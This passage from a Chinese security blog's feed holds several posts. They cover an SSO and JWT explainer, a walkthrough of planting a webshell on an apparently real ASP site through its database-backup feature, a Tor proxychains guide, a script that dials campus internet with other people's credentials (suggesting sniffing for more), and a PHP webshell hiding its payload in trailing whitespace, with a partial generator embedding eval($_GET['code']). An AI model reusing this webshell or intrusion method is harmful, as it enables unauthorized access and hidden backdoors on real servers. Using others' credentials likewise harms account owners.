src="https://upload-images.jianshu.io/upload_images/6269327-4103dd74f47ee196.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="CAS"><h2 id="跨域单点登录"><a href="#跨域单点登录" class="headerlink" title="跨域单点登录"></a>跨域单点登录</h2>学习了上面几种单点登录的知识，结合实际场景可知，跨域单点登录才是真正的单点登录，因为实际情况下很多平台或者域名不可能都在一个一级域名下。在解决跨域单点登录的问题的时候，上面也给说了几种方式，但是究其根本，就是利用一个SSO认证中心来实现认证与授权的。当然，也会有其他的解决跨域单点登录的方案，但是大体流程都与cas类似。<br><img src="https://upload-images.jianshu.io/upload_images/6269327-cdfbe6623e94fd4c.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="11"><br>比如在上图的11步骤，也可使用POST包，或者JSONP和iframe方法来跨域发送请求进行重定向。<br>在利用认证中心来实现单点登录是现在比较普遍的解决方案，那么有没有不需要使用认证中心来解决跨域单点登录的方案呢？<br>利用JSONP同步登录状态，大概流程流程如下：</li><li>用户访问a.com的登录页；</li><li>输入用户名密码登录，a.com后台校验用户，成功之后生成a站点的sesion并生成一个ticket放入redis中；</li><li>登录页面登录成功之后，拿到ticket往b.com发送一个跨域请求（使用JSONP或者Image）；</li><li>b站点获取到ticket之后，检验在redis是否存在，存在着设置b站点session并删除ticket；</li><li>跨域请求返回之后继续其他操作，如跳转用户中心，首页等。</li><li>用户访问b.com无需登录页面；</li><li>如果当前站点用户未登录，发起异步JSONP请求到a.com；</li><li>如果a.com未登录，不做任何操作。如果已经登录，跟上个流程一样，生成ticket信息；</li><li>拿到ticket之后，请求b站点同步登录状态，b站点生成session；</li><li>同步成功之后主动重新刷新当前页面。<br>这里使用JSONP来达到跨域的功能，但是也存在一定的问题。如果系统很多的话，可能在系统更替，增加或者减少的时候就必须对所有的系统进行更改。<h1 id="单点登录的认证和授权"><a href="#单点登录的认证和授权" class="headerlink" title="单点登录的认证和授权"></a>单点登录的认证和授权</h1>在学习单点登录的过程中，在其中认证的过程中授权令牌的传递等相关信息没有特别详细的说明，而且在思考单点登录的时候也会有想过一个比较矛盾的问题：单点登录的目标是为了让用户可以在相互信任的系统中一次登录即可，但是如果真的是做到所有用户都可以访问所有系统，岂不是会带来越权的问题，是否需要对不同的用户以不同的授权，甚至限制访问的应用，但是这样是不是就不是原本狭义的单点认证？<h2 id="统一身份认证和单点登录"><a href="#统一身份认证和单点登录" class="headerlink" title="统一身份认证和单点登录"></a>统一身份认证和单点登录</h2>在说单点登录的认证和授权之前，先谈一谈我一直想弄清楚的统一身份认证和单点登录的区别。说起单点登录可能很少听过，但是统一身份认证肯定不陌生，不管是企业还是高校都会有这种统一身份认证的系统。<br>统一身份认证最重要的一方面就是身份认证，另一方面就是和身份认证相关的授权控制，权限控制。而单点登录是多应用一次登录，也可以叫统一登录，可以理解为主要在认证方面。对于统一身份认证来说会有账号管理，如LDAP，认证管理OAuth，SMAL等，因此我觉得，统一身份认证一般是包括狭义的单点登录，狭义的单点登录，即只需要满足多应用一次登录即可。但是现在的单点登录，SSO系统并不仅仅是要求这些，他的范围正在慢慢扩大。<h2 id="单点登录的认证和授权-1"><a href="#单点登录的认证和授权-1" class="headerlink" title="单点登录的认证和授权"></a>单点登录的认证和授权</h2>单点登录的认证和授权，前面说到的CAS实现单点登录里就会看到需要ticket来进行认证，授权。CAS支持多种认证方案，比如OAuth，OpenID，SAML等等，我们可以来比较比较用这些协议的区别，或者说是在哪些场景下使用哪些认证方案较为合适。本身单点登录是没有权限控制的功能的，但是因为这些认证协议的需求，自然支持了权限控制。<br>在使用SAML进行认证的过程中，可以看到下图，其是基本流程都差不多，这里需要注意的就是在用户在认证中心成功登陆之后，重定向的时候返回的是一个SAML token，一个XML节点，这里的token会包括用户的身份信息，用户名等。<br><img src="https://upload-images.jianshu.io/upload_images/6269327-b298b7dc5732b796.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="SAML 2.0 Flow"><br>在OAuth2.0的标准中流程是和上面的基本相同，但是OAuth2因为客户端并没有一点是浏览器，所以token中默认是没有签名的。这里可能没有体现出来，OAuth2的目标是授权，所以token更关注的是权限，token在向认证服务器验证的时候就会有不同的授权，但是既然是授权，就间接实现了认证。<br><img src="https://upload-images.jianshu.io/upload_images/6269327-9372aa0aa3c3eb24.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"><br>OAuth的本意是一个应用允许另一个应用在用户授权的情况下访问自己的数据,OAuth 的设计本意更倾向于授权而非认证。就比如说，一个网站上登录的时候可使用google账号登录，然后可以看到我们登录的时候会让我们选择该网站可以访问的我们的google信息，这里就是使用OAuth的授权，进行信息访问。再看看另一个协议OpenID，OpenID也是经常用于第三方登录的，我们上面说到了OpenID实现的单点登录，其中的认证服务器就可以是第三方的，但是使用OpenID协议的第三方登录，只是一个认证功能，前面也强调过OpenID只是认证的协议，因此使用OpenID协议的第三方登录只是让我们免于注册，只是一个身份而已。<br>在OAuth和SAML中都提到了token来传递授权或者认证信息，而在OpenID协议中可能会使用OpenID，而最终一般都是使用session的机制来实现浏览器和应用直接的访问。另一种基于jwt的。<h2 id="使用JWT进行认证"><a href="#使用JWT进行认证" class="headerlink" title="使用JWT进行认证"></a>使用JWT进行认证</h2>在传统的认证中都是基于session机制的，具体的session模式上面也说了，根据其特性可知session的一些确定：</li><li>session保存在服务器，当注册用户很多，会增加服务器的开销。</li><li>用户认证之后，服务端做认证记录，如果认证的记录被保存在内存中的话，这意味着用户下次请求还必须要请求在这台服务器上,这样才能拿到授权的资源，这样在分布式的应用上，限制了负载均衡的能力。这也意味着限制了应用的扩展能力。</li><li>session是基于cookie来进行用户识别的, cookie如果被截获，用户就会很容易受到跨站请求伪造（CSRF）的攻击。<br>具体的JWT认证相关的信息有文章已经总结的很好了，就不重复说了，<a href="https://juejin.im/post/5d0dbb7e6fb9a07f0420512d" target="_blank" rel="noopener">传送门</a>。<br>概括一下JWT认证的优点：</li><li>因为json的通用性，所以JWT是可以进行跨语言支持的，像JAVA,JavaScript,NodeJS,PHP等很多语言都可以使用；</li><li>因为有了payload部分，所以JWT可以在自身存储一些其他业务逻辑所必要的非敏感信息；</li><li>便于传输，jwt的构成非常简单，字节占用很小，所以它是非常便于传输的；</li><li>它不需要在服务端保存会话信息, 所以它易于应用的扩展。<br>但是因为JWT的性质，在其签证信息三部分中前两部分都是base64加密，攻击者是可以轻易获取并破解的，所以在使用JWT时也会有一些安全性的问题：</li><li>不应该在jwt的payload部分存放敏感信息，因为该部分是客户端可解密的部分;</li><li>保护好secret私钥以及私钥的强度，该私钥非常重要;</li><li>如果可以，请使用https协议；</li><li>JWT要有过期时间，JWT过期后Token的置换问题。<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><a href="https://www.mutuallyhuman.com/blog/choosing-an-sso-strategy-saml-vs-oauth2/" target="_blank" rel="noopener">https://www.mutuallyhuman.com/blog/choosing-an-sso-strategy-saml-vs-oauth2/</a><br><a href="https://yq.aliyun.com/articles/636281" target="_blank" rel="noopener">https://yq.aliyun.com/articles/636281</a><br><a href="https://juejin.im/post/5d0dbb7e6fb9a07f0420512d" target="_blank" rel="noopener">https://juejin.im/post/5d0dbb7e6fb9a07f0420512d</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id&gt;&lt;a href=&quot;#&quot; class=&quot;headerlink&quot; title&gt;&lt;/a&gt;&lt;meta name=&quot;referrer&quot; content=&quot;no-referrer&quot;&gt;&lt;/h2&gt;&lt;h1 id=&quot;谈谈单点登录&quot;&gt;&lt;a href=&quot;#谈谈单点登录&quot; class=&quot;he
      
    
    </summary>
    
      <category term="安全知识" scheme="https://XD0ne.github.io/categories/%E5%AE%89%E5%85%A8%E7%9F%A5%E8%AF%86/"/>
    
    
      <category term="安全知识" scheme="https://XD0ne.github.io/tags/%E5%AE%89%E5%85%A8%E7%9F%A5%E8%AF%86/"/>
    
  </entry>
  
  <entry>
    <title>数据库备份拿webshell</title>
    <link href="https://XD0ne.github.io/2019/11/23/12.%20%E6%95%B0%E6%8D%AE%E5%BA%93%E5%A4%87%E4%BB%BD%E6%8B%BFwebshell/"/>
    <id>https://XD0ne.github.io/2019/11/23/12. 数据库备份拿webshell/</id>
    <published>2019-11-22T16:31:56.785Z</published>
    <updated>2019-11-22T16:31:56.786Z</updated>
    
    <content type="html"><![CDATA[<h2 id><a href="#" class="headerlink" title></a><meta name="referrer" content="no-referrer"></h2><h1 id="数据库备份拿webshell"><a href="#数据库备份拿webshell" class="headerlink" title="数据库备份拿webshell"></a>数据库备份拿webshell</h1><hr><h2 id="测试之前"><a href="#测试之前" class="headerlink" title="测试之前"></a>测试之前</h2><p>数据库备份拿webshell算是比较老的web后台才有的一个漏洞，之前也做过类似的，这次偶然有机会帮朋友看来一个类似的站，所以在此分享一下。仅供学习，严守底线。</p><h2 id="测试开始"><a href="#测试开始" class="headerlink" title="测试开始"></a>测试开始</h2> <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ http://xxxxxxx.com/Manage/login.asp</span><br></pre></td></tr></table></figure><p>登陆界面：<br><img src="https://upload-images.jianshu.io/upload_images/6269327-98608b271e4f9742.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="登陆"><br>帐号密码是若密码。然后进后台简单的看了看，发现是kindeditor的编辑器，13年的应该是4.1.10，所以之前爆出的漏洞基本不能使用：<br><img src="https://upload-images.jianshu.io/upload_images/6269327-bd787d76eee16c96.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="编辑器"><br>因为是很老的框架了，然后也会有网站根目录以及一些敏感信息：<br><img src="https://upload-images.jianshu.io/upload_images/6269327-691b32121515ace1.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="敏感信息"><br>然后发现有数据库备份，这网站基本凉了：<br><img src="https://upload-images.jianshu.io/upload_images/6269327-a906e1521b4b419e.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="数据库备份"><br>通过前面的信息我们可以看到这是asp+iis的站点，但是数据库备份的地点原始数据库不能更改但是备份数据库的可以更改，这比较简单，突破一下，抓包改一改就行。<br>然后现在我们先要上传一个图片的木马为数据库备份做准备，为啥呢？<br>简单说一下数据库备份拿shell的原理，数据库备份是为网站管理者提供备份数据的功能，网站管理者可以将指定位置的文件进行备份，但是为了安全，网站后台都是不允许我们自己指定位置的，比如我们现在这个，但是这个一看就是在前台加的限制，后台没有校验，所以我们可以向上传一个写入小马的图片文件，然后得到他的路径，在将这个路径进行数据库备份，备份是指定w为asp后缀就行。<br>上传图片：<br><img src="https://upload-images.jianshu.io/upload_images/6269327-e8cea9224c51c9c4.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="上传图片"><br> firefox看一下返回的路径就可以了，然后备份数据库抓包更改路径：<br><img src="https://upload-images.jianshu.io/upload_images/6269327-04772f0df74e8bb6.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="更改之前"><br>然后改一下需要备份的路径就行了，猜测一下路径：<br><img src="https://upload-images.jianshu.io/upload_images/6269327-ff34196fa72fa415.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="更改之后"><br>然后重发就可以了：<br><img src="https://upload-images.jianshu.io/upload_images/6269327-6d296d3b099669a3.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="重发"><br>看到这个返回就知道成功了，可以看到这个是有waf的，有狗的话可以注意过狗，狗的话虽然看着很凶，博主最近和狗打了太多的交道了，也就那几招，过多了就发现就是傻狗。一句话变相一下就行。<br>不过我们发现这里并没有爆出备份后的路径，这个大概猜一下就行实在猜不出来可以自己看一下这个框架了，毕竟马都传上去了。大概看了看，返回有FolderBackUp.asp然后请求的是/Manage/DataBackUp.asp这个路径，然后后台也说了备份文件夹是databackup，大概测了测就猜到了:<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ http://xxxxxx.com/Manage/databackup/mssqldb.asp</span><br></pre></td></tr></table></figure></p><p>然后菜刀连接一下就行了：<br><img src="https://upload-images.jianshu.io/upload_images/6269327-f476bbd27d950c8c.jpg?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="shell"><br>好了，就到此为止了，后面的就不往后深入了，清理痕迹。</p><h2 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h2><p>仅供学习，勿做他用。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id&gt;&lt;a href=&quot;#&quot; class=&quot;headerlink&quot; title&gt;&lt;/a&gt;&lt;meta name=&quot;referrer&quot; content=&quot;no-referrer&quot;&gt;&lt;/h2&gt;&lt;h1 id=&quot;数据库备份拿webshell&quot;&gt;&lt;a href=&quot;#数据库备份拿web
      
    
    </summary>
    
      <category term="实战演练" scheme="https://XD0ne.github.io/categories/%E5%AE%9E%E6%88%98%E6%BC%94%E7%BB%83/"/>
    
    
      <category term="数据库备份getshell" scheme="https://XD0ne.github.io/tags/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%A4%87%E4%BB%BDgetshell/"/>
    
  </entry>
  
  <entry>
    <title>服务器socket代理访问darknet</title>
    <link href="https://XD0ne.github.io/2019/11/22/31.%E6%9C%8D%E5%8A%A1%E5%99%A8socket%E4%BB%A3%E7%90%86%E8%AE%BF%E9%97%AEdarknet/"/>
    <id>https://XD0ne.github.io/2019/11/22/31.服务器socket代理访问darknet/</id>
    <published>2019-11-22T04:00:00.000Z</published>
    <updated>2019-11-22T16:31:56.809Z</updated>
    
    <content type="html"><![CDATA[<h2 id><a href="#" class="headerlink" title></a><meta name="referrer" content="no-referrer"></h2><h1 id="服务器socket代理访问darknet"><a href="#服务器socket代理访问darknet" class="headerlink" title="服务器socket代理访问darknet"></a>服务器socket代理访问darknet</h1><hr><p>[转] <a href="https://www.zhangminghao.com/post/48.html" target="_blank" rel="noopener">原文</a><br>chrome挂tor代理从darknet上下载东西是十分的慢，而且动不动就会断，速度还慢，十分难受。决定在服务器上使用wget挂代理下载，但是wget是不支持socket5的代理的，所以不能直接使用wget指定代理参数进行代理下载darkweb的文件，最后想着直接使用Proxychains工具进行终端代理。</p><h2 id="工具下载与安装"><a href="#工具下载与安装" class="headerlink" title="工具下载与安装"></a>工具下载与安装</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/rofl0r/proxychains-ng.git</span><br><span class="line"><span class="built_in">cd</span> proxychains-ng</span><br><span class="line">./configure --prefix=/usr --sysconfdir=/etc</span><br><span class="line">make</span><br><span class="line">sudo make install</span><br><span class="line">sudo make install-config</span><br></pre></td></tr></table></figure><h2 id="配置Proxychains"><a href="#配置Proxychains" class="headerlink" title="配置Proxychains"></a>配置Proxychains</h2><p>修改/etc/proxychains.conf文件<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[ProxyList]</span><br><span class="line"><span class="comment"># 将代理服务器添加到此处</span></span><br><span class="line"><span class="comment"># 格式:</span></span><br><span class="line"><span class="comment">#  socks5   192.168.67.78   1080  lamer   secret</span></span><br><span class="line"><span class="comment">#  http       192.168.89.3     8080  justu    hidden</span></span><br><span class="line"><span class="comment">#  socks4   192.168.1.49     1080</span></span><br><span class="line"><span class="comment">#  http       192.168.39.93   8080</span></span><br><span class="line"><span class="comment">#  支持的代理种类: http, socks4, socks5</span></span><br><span class="line"><span class="comment">#  支持的验证模式: "basic"-http  "user/pass"-socks</span></span><br><span class="line">socks5 127.0.0.1 1080</span><br></pre></td></tr></table></figure></p><p><img src="https://upload-images.jianshu.io/upload_images/6269327-57d0b82c58dd93c0.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><h2 id="使用Proxychains"><a href="#使用Proxychains" class="headerlink" title="使用Proxychains"></a>使用Proxychains</h2><p>当前Proxychains的版本是4.11，所以编译的二进制程序名是proxychains4，按以下格式使用<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">proxychains4  wget xxxxxxx.onion/1.txt</span><br></pre></td></tr></table></figure></p><p>再配合screen挂后台就行啦，这样就不怕下大文件动不动就断了。<br><img src="https://upload-images.jianshu.io/upload_images/6269327-53ade32da0d164f0.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id&gt;&lt;a href=&quot;#&quot; class=&quot;headerlink&quot; title&gt;&lt;/a&gt;&lt;meta name=&quot;referrer&quot; content=&quot;no-referrer&quot;&gt;&lt;/h2&gt;&lt;h1 id=&quot;服务器socket代理访问darknet&quot;&gt;&lt;a href=&quot;#服务器
      
    
    </summary>
    
      <category term="其他" scheme="https://XD0ne.github.io/categories/%E5%85%B6%E4%BB%96/"/>
    
    
      <category term="其他" scheme="https://XD0ne.github.io/tags/%E5%85%B6%E4%BB%96/"/>
    
  </entry>
  
  <entry>
    <title>简书文章图片外链403问题</title>
    <link href="https://XD0ne.github.io/2019/11/14/30.%E7%AE%80%E4%B9%A6%E6%96%87%E7%AB%A0%E5%9B%BE%E7%89%87%E5%A4%96%E9%93%BE403%E9%97%AE%E9%A2%98/"/>
    <id>https://XD0ne.github.io/2019/11/14/30.简书文章图片外链403问题/</id>
    <published>2019-11-14T04:00:00.000Z</published>
    <updated>2019-11-22T16:31:56.808Z</updated>
    
    <content type="html"><![CDATA[<h2 id><a href="#" class="headerlink" title></a><meta name="referrer" content="no-referrer"></h2><h1 id="简书文章图片外链403问题"><a href="#简书文章图片外链403问题" class="headerlink" title="简书文章图片外链403问题"></a>简书文章图片外链403问题</h1><hr><p>最近刚上研，所以事情比较多，一直没有注意到自己<a href="http://www.raosong.cc" target="_blank" rel="noopener">博客</a>的图片都无法访问了，都是403，后面了解才发现是简书对图片外链设置了限制，简单来说就是做了个根据http请求头中的referrer的值来验证请求是不是来自本站，如果不是就返回403或者重定向之类的。<br>可以看到简书这么做很明显是因为大部分人都把简书当做图床或者云笔记的平台来使用，高额的服务器费用，却没有代理经济价值，没有办法，只能通过这种方法来限制“白嫖用户”。<br>说说具体情况吧，我的博客是github上使用hexo搭建的，然后在简书写，写完同步到个人博客上的，简书的这个措施直接影响到我个人博客的使用了，那就只能改改呗。经过测试简书和微博的图片外链在referrer值为空也是可以访问的，所以他们的策略是只要你带了其他站点的信息就403，所以我们只要设置页面的referrer值为空就行。看了看网上的说法<br><img src="https://upload-images.jianshu.io/upload_images/6269327-37ca5e73fc4ae388.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"><br>直接在文章里面添加<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;meta name=<span class="string">"referrer"</span> content=<span class="string">"no-referrer"</span>/&gt;</span><br></pre></td></tr></table></figure></p><p>确实是个方法，但是我的文章太多了，一个一个加太麻烦了，而且我主页上还有图片呢，既然是hexo，直接生成静态页面的，那就直接改配置文件就行。<br>在themes/主题/layout路径里面找到生成页面的ejs文件，然后会有个head之类的ejs文件，在这里面加上上面的代码就行：<br><img src="https://upload-images.jianshu.io/upload_images/6269327-b3fa80672d620df9.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"><br>可能会在下面的子目录里面，或者其他的配置文件，具体看代码怎么写的。改好之后hexo d -g就行啦。最近写的比较少了，后面会慢慢继续开始记录一下东西了。<br>不知道后面简书或者其他的平台对于图片外链会有其他的限制手段，只能见招拆招了，不过应该就是在取舍上做的一个平衡了，要是真的把图片外链限制的死死的那就真的会损是很多用户的吧，所以我对这事还是挺放心的，毕竟我也不是白嫖党。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id&gt;&lt;a href=&quot;#&quot; class=&quot;headerlink&quot; title&gt;&lt;/a&gt;&lt;meta name=&quot;referrer&quot; content=&quot;no-referrer&quot;&gt;&lt;/h2&gt;&lt;h1 id=&quot;简书文章图片外链403问题&quot;&gt;&lt;a href=&quot;#简书文章图片外链40
      
    
    </summary>
    
      <category term="其他" scheme="https://XD0ne.github.io/categories/%E5%85%B6%E4%BB%96/"/>
    
    
      <category term="其他" scheme="https://XD0ne.github.io/tags/%E5%85%B6%E4%BB%96/"/>
    
  </entry>
  
  <entry>
    <title>python3 windows校园网自动拨号</title>
    <link href="https://XD0ne.github.io/2019/11/13/29.python3%20windows%E6%A0%A1%E5%9B%AD%E7%BD%91%E8%87%AA%E5%8A%A8%E6%8B%A8%E5%8F%B7/"/>
    <id>https://XD0ne.github.io/2019/11/13/29.python3 windows校园网自动拨号/</id>
    <published>2019-11-13T04:00:00.000Z</published>
    <updated>2019-11-22T16:31:56.806Z</updated>
    
    <content type="html"><![CDATA[<h2 id><a href="#" class="headerlink" title></a><meta name="referrer" content="no-referrer"></h2><h1 id="python3-windows校园网自动拨号"><a href="#python3-windows校园网自动拨号" class="headerlink" title="python3 windows校园网自动拨号"></a>python3 windows校园网自动拨号</h1><hr><h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>在学校基本没什么时间呆在宿舍，都在实验室。宿舍的台式基本都是用来打游戏的，特地去办个校园网觉得太亏了，但是免费的10G流量也根本不够用，更新个游戏一下就没了。突然发现本科毕业生的校园网每个人都有10G的毕业生流量，于是想着把这些账号拿来用，薅学校的羊毛。就把班上同学的账号要过来（也可以配合嗅探器来用），使用python3来自动拨号上网。</p><h2 id="小脚本"><a href="#小脚本" class="headerlink" title="小脚本"></a>小脚本</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">import os</span><br><span class="line">import time</span><br><span class="line">def connect(username,password):</span><br><span class="line">    name=<span class="string">"宽带连接"</span></span><br><span class="line">    cmd_str=<span class="string">"rasdial %s %s %s"</span> %(name,username,password)</span><br><span class="line">    res=os.system(cmd_str)</span><br><span class="line">    <span class="keyword">if</span> res==0:</span><br><span class="line">        <span class="built_in">return</span> True</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(res)</span><br><span class="line">    time.sleep(5)</span><br><span class="line">def disconnect():</span><br><span class="line">    name=<span class="string">"宽带连接"</span></span><br><span class="line">    cmdstr=<span class="string">"rasdial %s /disconnect"</span> %name</span><br><span class="line">    os.system(cmdstr)</span><br><span class="line">    time.sleep(5)</span><br><span class="line"><span class="keyword">if</span> __name__== <span class="string">"__main__"</span>:</span><br><span class="line">    f=open(<span class="string">"info.txt"</span>,<span class="string">"r"</span>)</span><br><span class="line">    i=0</span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> f:</span><br><span class="line">        i=i+1</span><br><span class="line">        line=line.strip(<span class="string">'\n'</span>)</span><br><span class="line">        <span class="built_in">print</span>(line[0:11],line[12:20])</span><br><span class="line">        <span class="keyword">if</span>(connect(line[0:11],line[12:20]) == True):</span><br><span class="line">            <span class="built_in">break</span></span><br><span class="line">        <span class="comment"># disconnect()</span></span><br><span class="line">    f.close()</span><br></pre></td></tr></table></figure><p>代码很简单就是一个，其实就是一个windows 内置的拨号连接命令rasdial的使用而已。在windows的cmd中可以查看具体参数以及功能。这个脚本从info.txt这个文件中读取校园网账号密码，然后拨号，遇到账号密码错误的情况，5s后就会自动重拨，直到拨上为止。这个info.txt其是配合嗅探器，在学校图书馆嗅探来获取确实很刺激，但是就太嫑脸了，同学的一些账号就够用了。（额，后面的处理格式的方式看起来有点傻:）<br>还有一些小bug，我们的校园网超过10G之后也是可以拨上的，但是会进行限速，很慢很慢，所以准备在脚本中加入测网速的模块，有现成的，还没加上，有空就加上。</p><h2 id="计划任务"><a href="#计划任务" class="headerlink" title="计划任务"></a>计划任务</h2><p>脚本写好了，接着利用windows的计划任务功能来设置脚本自启动。<br>新建一个计划任务，然后取名：<br><img src="https://upload-images.jianshu.io/upload_images/6269327-03d1caaaf048575f.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="1"><br>接着选择触发器，就是脚本执行的触发条件，我们设置为用户登录时，只要有用户登录就进行自动拨号。<br><img src="https://upload-images.jianshu.io/upload_images/6269327-950abd4fe766acd6.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="2"><br>最后执行选择启动程序，其中第一项程序或脚本就是我们执行脚本的编译器的路径，这里我用的是anaconda的python。第二项参数就是我们所执行的文件了，比如我们所执行的文件在C盘根目录，填的就是C:/test.py。最后一项比较关键，起始于，这个网上说法不同，根据试验，应该是脚本执行的位置，就是比如我们这里的自动拨号的脚本connect.py，如果没有填写起始于选项执行时就会出现找不到info.txt文件，所以我们要将起始于这个选项填到脚本所在路径。然后就可以啦，可以注销看看自动拨号。<br><img src="https://upload-images.jianshu.io/upload_images/6269327-b734a256d428c671.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="3"><br>还有补充会继续完善。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id&gt;&lt;a href=&quot;#&quot; class=&quot;headerlink&quot; title&gt;&lt;/a&gt;&lt;meta name=&quot;referrer&quot; content=&quot;no-referrer&quot;&gt;&lt;/h2&gt;&lt;h1 id=&quot;python3-windows校园网自动拨号&quot;&gt;&lt;a href=&quot;#p
      
    
    </summary>
    
      <category term="小脚本" scheme="https://XD0ne.github.io/categories/%E5%B0%8F%E8%84%9A%E6%9C%AC/"/>
    
    
      <category term="小脚本" scheme="https://XD0ne.github.io/tags/%E5%B0%8F%E8%84%9A%E6%9C%AC/"/>
    
  </entry>
  
  <entry>
    <title>一个过人的小马</title>
    <link href="https://XD0ne.github.io/2019/09/20/28.%E4%B8%80%E4%B8%AA%E8%BF%87%E4%BA%BA%E7%9A%84%E5%B0%8F%E9%A9%AC/"/>
    <id>https://XD0ne.github.io/2019/09/20/28.一个过人的小马/</id>
    <published>2019-09-20T04:00:00.000Z</published>
    <updated>2019-11-22T16:31:56.805Z</updated>
    
    <content type="html"><![CDATA[<h2 id><a href="#" class="headerlink" title></a><meta name="referrer" content="no-referrer"></h2><h1 id="一个过人的小马"><a href="#一个过人的小马" class="headerlink" title="一个过人的小马"></a>一个过人的小马</h1><hr><p>转自：<br><a href="https://imbawenzi.github.io/2019/04/18/一个有趣的webshell---将代码隐藏在空白处/" target="_blank" rel="noopener">https://imbawenzi.github.io/2019/04/18/一个有趣的webshell---将代码隐藏在空白处/</a><br>分享一个小马，不但过狗还过人。<br>小马代码部分：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    class newDataProvider &#123;</span><br><span class="line">        <span class="keyword">function</span> <span class="function"><span class="title">__construct</span></span>() &#123;</span><br><span class="line">            <span class="variable">$f</span> = file(__FILE__);</span><br><span class="line">            <span class="variable">$r</span> = <span class="string">""</span>;</span><br><span class="line">            <span class="variable">$c</span> = <span class="string">""</span>;</span><br><span class="line">            <span class="keyword">for</span>(<span class="variable">$i</span> = 0; <span class="variable">$i</span> &lt; count(<span class="variable">$f</span>); <span class="variable">$i</span>++) &#123;</span><br><span class="line">                <span class="keyword">if</span>(<span class="variable">$i</span> &lt; 15)&#123;</span><br><span class="line">                    <span class="variable">$r</span> .= <span class="variable">$this</span>-&gt;dataProcessor(<span class="variable">$f</span>[<span class="variable">$i</span>]);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="variable">$c</span> .= <span class="variable">$this</span>-&gt;dataProcessor(<span class="variable">$f</span>[<span class="variable">$i</span>]);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$t</span> = <span class="variable">$r</span>(<span class="string">''</span>,<span class="string">"<span class="variable">$c</span>"</span>);</span><br><span class="line">            <span class="variable">$t</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">function</span> dataProcessor(<span class="variable">$li</span>) &#123;</span><br><span class="line">            preg_match(<span class="string">'/([\t ]+)\r?\n?$/'</span>, <span class="variable">$li</span>, <span class="variable">$m</span>);</span><br><span class="line">            <span class="keyword">if</span> (isset(<span class="variable">$m</span>[1])) &#123;</span><br><span class="line">                <span class="variable">$l</span> = dechex(substr_count(<span class="variable">$m</span>[1], <span class="string">"\t"</span>));</span><br><span class="line">                <span class="variable">$r</span> = dechex(substr_count(<span class="variable">$m</span>[1], <span class="string">" "</span>));</span><br><span class="line">                <span class="variable">$n</span> = hexdec(<span class="variable">$l</span>.<span class="variable">$r</span>);</span><br><span class="line">                <span class="built_in">return</span> chr(<span class="variable">$n</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="built_in">return</span> <span class="string">""</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    new newDataProvider();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p><p>可以重点关注dataProcessor这个函数，通过正则匹配文件每一行最后的/t或者空格数，并以这两个的计数的十六进制分别代表一位，来拼成一个ascii码。显然这些空格和/t的数量是我们可以自己写好的，这样我们就可以构造空格和/t的数量来构造一个小马或者其他恶意代码。转载的博主已经实现了，可以看看：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">funcName = <span class="string">'create_function'</span></span><br><span class="line">code = <span class="string">'eval($_GET["code"]);'</span></span><br><span class="line">blank = funcName+code</span><br><span class="line"></span><br><span class="line">fin = open(<span class="string">'test.php'</span>,<span class="string">'r'</span>)</span><br><span class="line">fout = open(<span class="string">'testOutput.php'</span>,<span class="string">'w'</span>)</span><br><span class="line">content = fin.readlines()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> len(content) &lt; len(blank):</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(blank)-len(content)):</span><br><span class="line">content += [<span class="string">'\n'</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(blank)):</span><br><span class="line">tensPlace = int(hex(ord(blank[i]))[2], 